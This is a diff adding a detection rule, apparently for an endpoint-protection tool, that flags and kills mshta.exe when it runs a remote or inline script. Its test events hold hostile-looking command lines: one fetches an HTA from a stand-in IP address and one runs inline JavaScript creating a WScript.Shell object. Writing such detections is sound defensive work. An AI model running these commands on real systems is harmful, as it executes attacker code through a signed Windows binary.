@@ -1,0 +1,36 @@
+[rule]
+id = "etap-012"
+name = "MSHTA Running a Remote or Inline Script"
+description = "mshta.exe given a web address or an inline script, which runs attacker code through a signed Windows program."
+version = "1"
+author = "E-TAP team"
+license = "MIT"
+os_list = ["windows"]
+query = '''process where
+  process.name in~ ("mshta.exe")
+  and process.command_line : ("http://", "https://", "javascript:", "vbscript:")
+'''
+
+[[actions]]
+action = "kill_process"
+
+[[threat]]
+tactic.name = "Defense Evasion"
+[[threat.technique]]
+id = "T1218.005"
+name = "System Binary Proxy Execution: Mshta"
+
+[[tests]]
+name = "remote hta"
+expect = "match"
+event = { _category = "process", event = { action = "start" }, process = { name = "mshta.exe", executable = "C:\\Windows\\System32\\mshta.exe", command_line = "mshta.exe http://203.0.113.5/a.hta" } }
+
+[[tests]]
+name = "inline script"
+expect = "match"
+event = { _category = "process", event = { action = "start" }, process = { name = "mshta.exe", executable = "C:\\Windows\\System32\\mshta.exe", command_line = "mshta.exe javascript:a=new ActiveXObject('WScript.Shell')" } }
+
+[[tests]]
+name = "local hta"
+expect = "no_match"
+event = { _category = "process", event = { action = "start" }, process = { name = "mshta.exe", executable = "C:\\Windows\\System32\\mshta.exe", command_line = "mshta.exe C:\\apps\\local.hta" } }
